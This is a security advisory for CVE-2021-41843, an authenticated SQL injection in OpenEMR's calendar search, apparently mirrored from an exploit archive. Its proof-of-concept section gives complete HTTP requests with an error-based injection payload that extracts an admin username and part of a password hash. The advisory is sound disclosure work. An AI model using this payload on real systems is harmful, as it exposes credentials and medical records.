@@ -1,0 +1,127 @@
+id: 37149
+date: 12/15/2021
+title: OpenEMR 6.0.0 / 6.1.0-dev SQL Injection Vulnerability
+author: Stefan Pietsch
+cves: CVE-2021-41843
+
+Authenticated SQL injection in OpenEMR calendar search
+######################################################
+
+
+Overview
+########
+
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2109-01
+Affected product: OpenEMR web application
+Tested versions: 6.0.0, 6.1.0-dev
+Vendor: OpenEMR project, https://www.open-emr.org
+Credits: Trovent Security GmbH, Stefan Pietsch
+
+
+Detailed description
+####################
+
+The OpenEMR web application is a medical practice management software and can
+be used to store electronic medical records.
+Trovent Security GmbH discovered an SQL injection vulnerability in the search
+function of the calendar module. The parameter 'provider_id' is injectable.
+The attacker needs a valid user account to access the calendar module of the
+web application. It is possible to read data from all tables of the database.
+
+Severity: Medium
+CVSS Score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
+CWE ID: CWE-89
+CVE ID: CVE-2021-41843
+
+
+Proof of concept
+################
+
+(1) HTTP request to read a username from the database table 'openemr.users_secure':
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+POST /interface/main/calendar/index.php?module=PostCalendar&func=search HTTP/1.1
+Content-Length: 324
+Host: 172.18.0.3
+Content-Type: application/x-www-form-urlencoded
+Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
+Connection: close
+
+pc_keywords=TRVNT&pc_keywords_andor=AND&pc_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&
+provider_id=%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%28IFNULL%28CAST%28username
+%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users_secure%20ORDER%20BY%20id%29%29%2C1%29%29&pc_facility=&submit=Submit
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+(2) HTTP response to (1):
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+HTTP/1.1 200 OK
+Date: Fri, 17 Sep 2021 07:26:48 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:13:28 GMT; Max-Age=28000; path=/; SameSite=Strict
+Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:13:29 GMT; Max-Age=28000; path=/; SameSite=Strict
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-XSS-Protection: 1; mode=block
+Content-Length: 27
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+XPATH syntax error: 'admin'
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+(3) HTTP request to read a password hash from the database table 'openemr.users_secure':
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+POST /interface/main/calendar/index.php?module=PostCalendar&func=search HTTP/1.1
+Content-Length: 324
+Host: 172.18.0.3
+Content-Type: application/x-www-form-urlencoded
+Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
+Connection: close
+
+pc_keywords=TRVNT&pc_keywords_andor=AND&pc_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&
+provider_id=%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%28IFNULL%28CAST%28password
+%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users_secure%20ORDER%20BY%20id%29%29%2C1%29%29&pc_facility=&submit=Submit
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+(4) HTTP response to (3):
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+HTTP/1.1 200 OK
+Date: Fri, 17 Sep 2021 07:27:29 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:14:09 GMT; Max-Age=28000; path=/; SameSite=Strict
+Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:14:09 GMT; Max-Age=28000; path=/; SameSite=Strict
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-XSS-Protection: 1; mode=block
+Content-Length: 44
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+XPATH syntax error: '$2y$10$ukudH2lRSW2vKX.'
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Solution / Workaround
+#####################
+
+Limit access to the calendar search function until the vulnerability is fixed.
+
+Fixed in OpenEMR version 6.0.0 patch 3, verified by Trovent.
+
+#  0day.today [2023-03-26]  #
